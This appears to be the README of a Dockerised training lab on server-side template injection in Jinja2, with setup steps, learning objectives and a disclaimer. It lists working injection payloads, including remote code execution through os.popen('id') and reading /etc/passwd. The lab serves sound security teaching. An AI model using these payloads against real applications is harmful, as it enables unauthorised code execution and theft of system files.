🔐 SSTI Lab - Server-Side Template Injection
This lab environment is designed to help you learn about Server-Side Template Injection (SSTI) vulnerabilities and enhance your web application pentesting skills.

🚀 Getting Started
1. Clone the Repository

git clone <repository-url>

cd ssti-lab

2. Run with Docker

# Build and run using Docker Compose

docker-compose up --build

# Or run manually
docker build -t ssti-lab .
docker run -p 5000:5000 ssti-lab
3. Open in Browser

http://localhost:5000

🎯 Lab Objectives
This lab allows participants to explore the following SSTI-related concepts:

Basic template injection techniques

Exploitation of the Jinja2 template engine

Achieving Remote Code Execution (RCE)

Accessing the server file system

Extracting environment variables

🔍 Example Test Payloads
Here are some basic payloads you can try in the lab:

Basic Arithmetic Test

{{ 7*7 }}

Access Environment Configuration

{{ config }}

Explore Python Objects

{{ ''.__class__.__mro__[1].__subclasses__() }}

Remote Code Execution (Jinja2)

{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

File Access Example

{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /etc/passwd').read() }}

⚠️ Security Disclaimer
Use only for educational purposes

Do not target real systems

Run the lab in a controlled environment

Stop and clean up containers after testing

🛠️ Configuration Options
Change Listening Port
In the docker-compose.yml file:

ports:
  - "8080:5000"  # Change host port to 8080
Disable Debug Mode
In app.py:

app.run(host='0.0.0.0', port=5000, debug=False)
📚 Additional Resources
Source code preview: http://localhost:5000/source

OWASP Web Security Testing Guide: SSTI Testing

PayloadsAllTheThings GitHub: SSTI

🔧 Troubleshooting
If Port 5000 is Already in Use
docker-compose down
lsof -ti:5000 | xargs kill -9
docker-compose up
Stop and Clean Containers
docker-compose down
docker system prune -a
Author: t.me/realbobur
